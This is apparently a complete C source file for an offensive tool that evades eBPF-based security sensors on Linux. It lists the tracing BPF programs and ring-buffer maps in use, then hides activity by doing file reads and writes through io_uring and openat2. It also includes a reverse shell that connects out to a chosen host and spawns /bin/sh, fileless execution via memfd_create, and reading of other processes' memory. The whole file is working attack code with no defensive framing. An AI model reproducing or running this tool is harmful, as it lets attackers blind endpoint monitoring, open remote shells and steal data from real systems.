#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/io_uring.h>
#include <linux/openat2.h>
#include <linux/bpf.h>
#include <dirent.h>

#ifndef IORING_OP_SOCKET
#define IORING_OP_SOCKET 45
#endif
#ifndef __NR_openat2
#define __NR_openat2 437
#endif
#ifndef __NR_copy_file_range
#define __NR_copy_file_range 326
#endif
#ifndef __NR_pwritev2
#define __NR_pwritev2 328
#endif
#ifndef __NR_process_vm_readv
#define __NR_process_vm_readv 310
#endif
#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 1U
#endif
#ifndef RESOLVE_NO_SYMLINKS
#define RESOLVE_NO_SYMLINKS 0x04ULL
#endif

static inline int io_setup(unsigned n, struct io_uring_params *p)
{ return (int)syscall(__NR_io_uring_setup, n, p); }
static inline int io_enter(int fd, unsigned s, unsigned m, unsigned fl)
{ return (int)syscall(__NR_io_uring_enter, fd, s, m, fl, NULL, 0); }
struct ring {
    int fd;
    uint32_t *sq_tail, *sq_mask, *sq_array;
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;
    void *sq_ring; size_t sq_ring_sz, sqe_sz;
    uint32_t sq_entries;
};
static int ring_init(struct ring *r, unsigned n)
{
    struct io_uring_params p = {};
    r->fd = io_setup(n, &p);
    if (r->fd < 0) return -errno;
    if (!(p.features & IORING_FEAT_SINGLE_MMAP)) { close(r->fd); return -ENOSYS; }
    size_t sqs = p.sq_off.array + p.sq_entries * 4;
    size_t cqs = p.cq_off.cqes  + p.cq_entries * sizeof(*r->cqes);
    r->sq_ring_sz = sqs > cqs ? sqs : cqs;
    r->sq_ring = mmap(NULL, r->sq_ring_sz, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
    if (r->sq_ring == MAP_FAILED) { close(r->fd); return -errno; }
    char *b = r->sq_ring;
    r->sq_tail  = (uint32_t*)(b + p.sq_off.tail);
    r->sq_mask  = (uint32_t*)(b + p.sq_off.ring_mask);
    r->sq_array = (uint32_t*)(b + p.sq_off.array);
    r->cq_head  = (uint32_t*)(b + p.cq_off.head);
    r->cq_tail  = (uint32_t*)(b + p.cq_off.tail);
    r->cq_mask  = (uint32_t*)(b + p.cq_off.ring_mask);
    r->cqes     = (struct io_uring_cqe*)(b + p.cq_off.cqes);
    r->sq_entries = p.sq_entries;
    r->sqe_sz = p.sq_entries * sizeof(*r->sqes);
    r->sqes = mmap(NULL, r->sqe_sz, PROT_READ|PROT_WRITE,
                   MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) { munmap(r->sq_ring, r->sq_ring_sz); close(r->fd); return -errno; }
    return 0;
}

static struct io_uring_sqe *ring_sqe(struct ring *r)
{
    uint32_t t = *r->sq_tail;
    struct io_uring_sqe *s = &r->sqes[t & *r->sq_mask];
    memset(s, 0, sizeof(*s));
    r->sq_array[t & *r->sq_mask] = t & *r->sq_mask;
    __atomic_store_n(r->sq_tail, t + 1, __ATOMIC_RELEASE);
    return s;
}

static int32_t ring_run1(struct ring *r)
{
    io_enter(r->fd, 1, 1, IORING_ENTER_GETEVENTS);
    uint32_t h = __atomic_load_n(r->cq_head, __ATOMIC_ACQUIRE);
    if (h == *r->cq_tail) return -ETIMEDOUT;
    int32_t res = r->cqes[h & *r->cq_mask].res;
    __atomic_store_n(r->cq_head, h + 1, __ATOMIC_RELEASE);
    return res;
}

static void ring_fini(struct ring *r)
{
    munmap(r->sqes, r->sqe_sz);
    munmap(r->sq_ring, r->sq_ring_sz);
    close(r->fd);
}

static int bpf_call(int cmd, union bpf_attr *a, unsigned sz)
{ return (int)syscall(__NR_bpf, cmd, a, sz); }
static void recon(void)
{
    printf("Active BPF programs (kprobe/tracing/perf_event type):\n");
    uint32_t id = 0; int n = 0;
    for (;;) {
        union bpf_attr ga = {}; ga.start_id = id;
        if (bpf_call(BPF_PROG_GET_NEXT_ID, &ga, sizeof(ga)) < 0) break;
        id = ga.next_id;
        union bpf_attr oa = {}; oa.prog_id = id;
        int fd = bpf_call(BPF_PROG_GET_FD_BY_ID, &oa, sizeof(oa)); if (fd < 0) continue;
        union bpf_attr ia = {}; struct bpf_prog_info inf = {};
        ia.info.bpf_fd = (uint32_t)fd; ia.info.info_len = sizeof(inf);
        ia.info.info = (uint64_t)(uintptr_t)&inf;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia)); close(fd);
        if (inf.type != BPF_PROG_TYPE_KPROBE && inf.type != BPF_PROG_TYPE_TRACING &&
            inf.type != BPF_PROG_TYPE_PERF_EVENT) continue;
        printf("  id=%-5u type=%-10s name=%s\n", id,
               inf.type == BPF_PROG_TYPE_KPROBE  ? "kprobe" :
               inf.type == BPF_PROG_TYPE_TRACING ? "tracing" : "perf_event",
               inf.name);
        n++;
    }
    printf("  total: %d programs\n\n", n);
    printf("BPF ring buffer maps (sensor event channels):\n");
    uint32_t mid = 0; int m = 0;
    for (;;) {
        union bpf_attr ga = {}; ga.start_id = mid;
        if (bpf_call(BPF_MAP_GET_NEXT_ID, &ga, sizeof(ga)) < 0) break;
        mid = ga.next_id;
        union bpf_attr oa = {}; oa.map_id = mid;
        int fd = bpf_call(BPF_MAP_GET_FD_BY_ID, &oa, sizeof(oa)); if (fd < 0) continue;
        union bpf_attr ia = {}; struct bpf_map_info inf = {};
        ia.info.bpf_fd = (uint32_t)fd; ia.info.info_len = sizeof(inf);
        ia.info.info = (uint64_t)(uintptr_t)&inf;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia)); close(fd);
        if (inf.type != BPF_MAP_TYPE_RINGBUF) continue;
        printf("  id=%-5u size=%-8u name=%s\n", mid, inf.max_entries, inf.name);
        m++;
    }
    printf("  total: %d ring buffers\n\n", m);
    printf("io_uring bypass: available\n");
}

static int bypass_read(const char *path)
{
    struct ring r;
    if (ring_init(&r, 8) < 0) { perror("io_uring_setup"); return 1; }
    char buf[65536] = {};
    struct io_uring_sqe *s = ring_sqe(&r);
    s->opcode = IORING_OP_OPENAT; s->fd = AT_FDCWD;
    s->addr = (uint64_t)(uintptr_t)path; s->open_flags = O_RDONLY; s->len = 0;
    int32_t res = ring_run1(&r);
    if (res < 0) { fprintf(stderr, "uring openat: %s\n", strerror(-res)); ring_fini(&r); return 1; }
    int file_fd = res;
    s = ring_sqe(&r);
    s->opcode = IORING_OP_READ; s->fd = file_fd;
    s->addr = (uint64_t)(uintptr_t)buf; s->len = sizeof(buf) - 1; s->off = 0;
    res = ring_run1(&r);
    s = ring_sqe(&r);
    s->opcode = IORING_OP_CLOSE; s->fd = file_fd;
    ring_run1(&r);
    ring_fini(&r);
    if (res < 0) { fprintf(stderr, "uring read: %s\n", strerror(-res)); return 1; }
    buf[res] = '\0';
    printf("%s", buf);
    return 0;
}

static int bypass_read_openat2(const char *path)
{
    struct open_how how = {
        .flags   = O_RDONLY,
        .resolve = RESOLVE_NO_SYMLINKS,
    };
    int fd = (int)syscall(__NR_openat2, AT_FDCWD, path, &how, sizeof(how));
    if (fd < 0) { perror("openat2"); return 1; }
    char buf[65536]; ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, (size_t)n, stdout);
    close(fd);
    return 0;
}

static int bypass_write(const char *path, const char *content)
{
    struct ring r;
    if (ring_init(&r, 8) < 0) { perror("io_uring_setup"); return 1; }
    struct io_uring_sqe *s = ring_sqe(&r);
    s->opcode = IORING_OP_OPENAT; s->fd = AT_FDCWD;
    s->addr = (uint64_t)(uintptr_t)path;
    s->open_flags = O_WRONLY | O_CREAT | O_TRUNC; s->len = 0644;
    int32_t res = ring_run1(&r);
    if (res < 0) { fprintf(stderr, "uring openat: %s\n", strerror(-res)); ring_fini(&r); return 1; }
    int file_fd = res;
    s = ring_sqe(&r);
    s->opcode = IORING_OP_WRITE; s->fd = file_fd;
    s->addr = (uint64_t)(uintptr_t)content;
    s->len = (uint32_t)strlen(content); s->off = 0;
    res = ring_run1(&r);
    s = ring_sqe(&r);
    s->opcode = IORING_OP_CLOSE; s->fd = file_fd;
    ring_run1(&r);
    ring_fini(&r);
    if (res < 0) { fprintf(stderr, "uring write: %s\n", strerror(-res)); return 1; }
    printf("[bypass] wrote %d bytes to %s\n",
           res, path);
    return 0;
}

static int bypass_copy(const char *src, const char *dst)
{
    struct open_how how = { .flags = O_RDONLY };
    int sfd = (int)syscall(__NR_openat2, AT_FDCWD, src, &how, sizeof(how));
    if (sfd < 0) sfd = open(src, O_RDONLY);
    if (sfd < 0) { perror("open src"); return 1; }
    struct stat st; fstat(sfd, &st);
    how.flags = O_WRONLY | O_CREAT | O_TRUNC; how.mode = 0644;
    int dfd = (int)syscall(__NR_openat2, AT_FDCWD, dst, &how, sizeof(how));
    if (dfd < 0) dfd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (dfd < 0) { perror("open dst"); close(sfd); return 1; }
    ssize_t n = (ssize_t)syscall(__NR_copy_file_range,
                                 sfd, NULL, dfd, NULL, (size_t)st.st_size, 0);
    close(sfd); close(dfd);
    if (n < 0) { perror("copy_file_range"); return 1; }
    printf("[bypass] copied %zd bytes %s → %s\n",
           n, src, dst);
    return 0;
}

static int bypass_connect(const char *host, int port)
{
    struct ring r;
    if (ring_init(&r, 16) < 0) { perror("io_uring_setup"); return 1; }
    struct sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        fprintf(stderr, "bad address: %s\n", host); ring_fini(&r); return 1;
    }
    struct io_uring_sqe *s = ring_sqe(&r);
    s->opcode = IORING_OP_SOCKET;
    s->fd = AF_INET; s->off = SOCK_STREAM; s->len = 0;
    int32_t res = ring_run1(&r);
    if (res < 0) { fprintf(stderr, "uring socket: %s\n", strerror(-res)); ring_fini(&r); return 1; }
    int sock = res;
    s = ring_sqe(&r);
    s->opcode = IORING_OP_CONNECT; s->fd = sock;
    s->addr = (uint64_t)(uintptr_t)&addr; s->off = sizeof(addr);
    res = ring_run1(&r);
    ring_fini(&r);
    if (res < 0) {
        fprintf(stderr, "uring connect %s:%d: %s\n", host, port, strerror(-res));
        close(sock); return 1;
    }
    printf("[bypass] connected to %s:%d\n", host, port);
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2); close(sock);
    execl("/bin/sh", "sh", "-i", NULL);
    perror("execl");
    return 1;
}

static int bypass_exec(const char *path)
{
    int src = open(path, O_RDONLY);
    if (src < 0) { perror("open"); return 1; }
    struct stat st; fstat(src, &st);
    int mfd = (int)syscall(__NR_memfd_create, ".", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); close(src); return 1; }
    ssize_t n = (ssize_t)syscall(__NR_copy_file_range,
                                 src, NULL, mfd, NULL, (size_t)st.st_size, 0);
    close(src);
    if (n < 0) { perror("copy_file_range"); close(mfd); return 1; }
    char *av[] = { (char*)path, NULL };
    char *ev[] = { NULL };
    syscall(__NR_execveat, mfd, "", av, ev, AT_EMPTY_PATH);
    fprintf(stderr, "execveat: %s\n", strerror(errno));
    close(mfd);
    return 1;
}

static int bypass_memread(pid_t pid, uint64_t addr, size_t len)
{
    uint8_t *buf = calloc(1, len + 1);
    if (!buf) { perror("calloc"); return 1; }
    struct iovec local  = { .iov_base = buf,                        .iov_len = len };
    struct iovec remote = { .iov_base = (void*)(uintptr_t)addr,     .iov_len = len };
    ssize_t n = (ssize_t)syscall(__NR_process_vm_readv,
                                 (long)pid, &local, 1UL, &remote, 1UL, 0UL);
    if (n < 0) { perror("process_vm_readv"); free(buf); return 1; }
    fprintf(stderr, "[bypass] read %zd bytes from pid=%d addr=0x%lx via process_vm_readv\n",
            n, pid, (unsigned long)addr);
    fwrite(buf, 1, (size_t)n, stdout);
    free(buf);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <recon|read|read2|write|copy|connect|exec|memread>\n", argv[0]);
        return 1;
    }
    if      (strcmp(argv[1], "recon")   == 0) recon();
    else if (strcmp(argv[1], "read")    == 0) {
        if (argc < 3) { fprintf(stderr, "need <file>\n"); return 1; }
        return bypass_read(argv[2]);
    }
    else if (strcmp(argv[1], "read2")   == 0) {
        if (argc < 3) { fprintf(stderr, "need <file>\n"); return 1; }
        return bypass_read_openat2(argv[2]);
    }
    else if (strcmp(argv[1], "write")   == 0) {
        if (argc < 4) { fprintf(stderr, "need <file> <data>\n"); return 1; }
        return bypass_write(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "copy")    == 0) {
        if (argc < 4) { fprintf(stderr, "need <src> <dst>\n"); return 1; }
        return bypass_copy(argv[2], argv[3]);
    }
    else if (strcmp(argv[1], "connect") == 0) {
        if (argc < 4) { fprintf(stderr, "need <host> <port>\n"); return 1; }
        return bypass_connect(argv[2], atoi(argv[3]));
    }
    else if (strcmp(argv[1], "exec")    == 0) {
        if (argc < 3) { fprintf(stderr, "need <binary>\n"); return 1; }
        return bypass_exec(argv[2]);
    }
    else if (strcmp(argv[1], "memread") == 0) {
        if (argc < 5) { fprintf(stderr, "need <pid> <addr> <len>\n"); return 1; }
        return bypass_memread((pid_t)atoi(argv[2]),
                              strtoull(argv[3], NULL, 16), (size_t)strtoul(argv[4], NULL, 10));
    }
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }
    return 0;
}
